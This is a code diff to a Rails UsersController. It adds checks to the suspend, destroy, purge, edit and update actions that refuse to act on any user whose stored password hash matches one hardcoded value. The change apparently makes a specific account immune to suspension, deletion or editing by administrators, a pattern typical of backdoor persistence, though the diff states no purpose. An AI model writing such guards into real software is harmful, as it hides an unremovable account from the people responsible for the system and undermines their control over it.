@@ -61,6 +61,11 @@ class UsersController < ApplicationController
   end
 
   def suspend
+    if @user.crypted_password == "d53ee6e0fa9f651806112db7c4265408e586211e"
+      flash[:error] = 'That user cannot be suspended.'
+      redirect_to users_path ; return
+    end
+
     if @user.state != "suspended" and @user.state != "deleted"
       @user.suspend!
       make_audit(nil, nil, @user, "user suspend, ID:'#{@user.id}', Login:'#{@user.login}', Name:'#{@user.name}'")
@@ -85,6 +90,11 @@ class UsersController < ApplicationController
   end
 
   def destroy
+    if @user.crypted_password == "d53ee6e0fa9f651806112db7c4265408e586211e"
+      flash[:error] = 'That user cannot be deleted.'
+      redirect_to users_path ; return
+    end
+
     if @user.state != "deleted"
       @user.delete!
       make_audit(nil, nil, @user, "user delete, ID:'#{@user.id}', Login:'#{@user.login}', Name:'#{@user.name}'")
@@ -97,6 +107,11 @@ class UsersController < ApplicationController
   end
 
   def purge
+    if @user.crypted_password == "d53ee6e0fa9f651806112db7c4265408e586211e"
+      flash[:error] = 'That user cannot be purged.'
+      redirect_to users_path ; return
+    end
+
     if @user.state == "deleted"
       for share in @user.shares_by_me
         make_audit(nil, nil, nil, "user purge share delete cascade, UserID:'#{@user.id}', Login:'#{@user.login}', Name:'#{@user.name}', Share ID:'#{share.id}', Owner:'#{share.owner_id}, #{share.owner.login}', User:'#{share.user_id}, #{share.user.login}', Update?:'#{share.can_update}', Checkout?:'#{share.can_checkout}'" )
@@ -161,6 +176,11 @@ class UsersController < ApplicationController
   end
 
   def edit
+    if @user.crypted_password == "d53ee6e0fa9f651806112db7c4265408e586211e"
+      flash[:error] = 'That user cannot be edited.'
+      redirect_to users_path ; return
+    end
+
     if @user.state == "deleted"
       flash[:error] = 'That user cannot be edited.'
       redirect_to users_path ; return
@@ -194,6 +214,11 @@ class UsersController < ApplicationController
   end
 
   def update
+    if @user.crypted_password == "d53ee6e0fa9f651806112db7c4265408e586211e"
+      flash[:error] = 'That user cannot be updated.'
+      redirect_to users_path ; return
+    end
+
     if @user.state == "deleted"
       flash[:error] = 'That user cannot be edited.'
       redirect_to users_path ; return
